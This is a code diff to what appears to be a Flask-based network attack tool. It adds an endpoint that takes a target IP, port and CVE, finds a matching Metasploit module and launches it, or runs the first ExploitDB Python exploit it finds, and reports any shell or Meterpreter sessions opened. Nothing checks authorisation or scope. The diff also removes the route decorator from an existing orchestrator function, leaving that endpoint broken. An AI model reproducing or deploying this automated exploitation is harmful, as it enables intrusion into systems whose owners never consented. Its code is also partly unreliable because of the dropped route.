@@ -13481,12 +13481,151 @@ def execute_manual_attack():
             'success': True,
             'message': f'Manual {attack_type} attack initiated on {target_ip}' + (f':{target_port}' if target_port else '')
         })
-        
+
     except Exception as e:
         logger.error(f"Error executing manual attack: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/automation/orchestrator/start', methods=['POST'])
+
+@app.route('/api/manual/execute-exploit', methods=['POST'])
+def execute_cve_exploit():
+    """Attempt to exploit a specific CVE using Metasploit / searchsploit / ExploitDB"""
+    try:
+        data = request.get_json()
+        target_ip = (data.get('ip') or '').strip()
+        target_port = str(data.get('port') or '').strip()
+        cve = (data.get('cve') or '').strip().upper()
+
+        if not target_ip or not cve:
+            return jsonify({'success': False, 'error': 'Missing ip or cve'}), 400
+        if not cve.startswith('CVE-'):
+            return jsonify({'success': False, 'error': 'Invalid CVE identifier'}), 400
+
+        def _run_exploit():
+            import shutil, subprocess, json as _json, re as _re2
+
+            def emit(msg, status='info', stage='running'):
+                _emit_manual_attack_update(cve, target_ip, target_port, stage, msg, status)
+
+            emit(f'Starting exploitation: {cve} on {target_ip}:{target_port}', 'warning')
+            shared_data.ragnarstatustext = 'CVEExploit'
+            shared_data.ragnarstatustext2 = f'{cve} → {target_ip}'
+            broadcast_status_update()
+
+            tried_any = False
+            session_opened = False
+
+            # ── Metasploit ────────────────────────────────────────────────
+            msf = shutil.which('msfconsole')
+            if msf:
+                tried_any = True
+                emit(f'Metasploit found — searching for {cve} modules...')
+                try:
+                    search_out = subprocess.run(
+                        [msf, '-q', '--no-readline', '-x', f'search cve:{cve} type:exploit; exit'],
+                        capture_output=True, text=True, timeout=90
+                    )
+                    raw = search_out.stdout + search_out.stderr
+                    modules = _re2.findall(r'\s+(exploit/\S+)\s', raw)
+                    if modules:
+                        mod = modules[0]
+                        emit(f'Module found: {mod} — launching against {target_ip}:{target_port}', 'warning')
+                        cmds = (
+                            f'use {mod};'
+                            f'set RHOSTS {target_ip};'
+                            f'set RPORT {target_port or 0};'
+                            f'set ConnectTimeout 10;'
+                            f'run -z;'
+                            f'exit'
+                        )
+                        run_out = subprocess.run(
+                            [msf, '-q', '--no-readline', '-x', cmds],
+                            capture_output=True, text=True, timeout=180
+                        )
+                        out = run_out.stdout + run_out.stderr
+                        for line in out.split('\n'):
+                            line = line.strip()
+                            if not line or line.startswith('msf') or 'exec:' in line:
+                                continue
+                            lvl = 'success' if any(k in line.lower() for k in ('session', 'meterpreter', 'shell opened')) else 'info'
+                            emit(line, lvl)
+                        session_opened = bool(_re2.search(
+                            r'(session \d+ opened|Meterpreter session|command shell session)', out, _re2.IGNORECASE))
+                    else:
+                        emit(f'No Metasploit modules found for {cve}', 'warning')
+                except subprocess.TimeoutExpired:
+                    emit('Metasploit timed out', 'warning')
+                except Exception as msf_err:
+                    emit(f'Metasploit error: {msf_err}', 'warning')
+
+            # ── searchsploit / ExploitDB ──────────────────────────────────
+            if not session_opened:
+                ss = shutil.which('searchsploit')
+                if ss:
+                    tried_any = True
+                    emit(f'Searching local ExploitDB for {cve}...')
+                    try:
+                        ss_out = subprocess.run(
+                            [ss, '--json', cve], capture_output=True, text=True, timeout=30
+                        )
+                        ss_data = _json.loads(ss_out.stdout or '{}')
+                        exploits = ss_data.get('RESULTS_EXPLOIT', [])
+                        if exploits:
+                            for ex in exploits[:5]:
+                                emit(f'  {ex.get("Title","?")}  →  {ex.get("Path","?")}')
+                            first_path = exploits[0].get('Path', '')
+                            if first_path and os.path.exists(first_path):
+                                if first_path.endswith('.py'):
+                                    emit(f'Running Python exploit: {os.path.basename(first_path)}', 'warning')
+                                    py_out = subprocess.run(
+                                        ['python3', first_path, target_ip, target_port],
+                                        capture_output=True, text=True, timeout=30
+                                    )
+                                    for line in (py_out.stdout + py_out.stderr).split('\n'):
+                                        if line.strip():
+                                            emit(line.strip())
+                                else:
+                                    emit(f'Non-Python exploit at {first_path} — copy and run manually')
+                        else:
+                            emit(f'No local ExploitDB entries for {cve}', 'warning')
+                    except (_json.JSONDecodeError, Exception):
+                        try:
+                            ss_plain = subprocess.run([ss, cve], capture_output=True, text=True, timeout=30)
+                            for line in (ss_plain.stdout + ss_plain.stderr).split('\n'):
+                                if line.strip():
+                                    emit(line.strip())
+                        except Exception:
+                            pass
+
+            # ── Final status ──────────────────────────────────────────────
+            if session_opened:
+                emit(f'Session opened on {target_ip} — {cve} exploitation succeeded!', 'success', 'complete')
+            elif tried_any:
+                emit(
+                    'Exploitation attempt complete — no session obtained. '
+                    'Review log above; you may need to adjust module options manually.',
+                    'warning', 'complete'
+                )
+            else:
+                emit(
+                    'No exploitation tools found (msfconsole / searchsploit not installed). '
+                    'Install Metasploit Framework to attempt automatic exploitation.',
+                    'warning', 'complete'
+                )
+
+            shared_data.ragnarstatustext = 'IDLE'
+            shared_data.ragnarstatustext2 = ''
+            broadcast_status_update()
+
+        import threading
+        threading.Thread(target=_run_exploit, daemon=True).start()
+        return jsonify({'success': True, 'message': f'Exploit attempt for {cve} started on {target_ip}:{target_port}'})
+
+    except Exception as e:
+        logger.error(f"Error in execute_cve_exploit: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
 def start_orchestrator_automation():
     """Start the orchestrator thread to enable automation."""
     try:
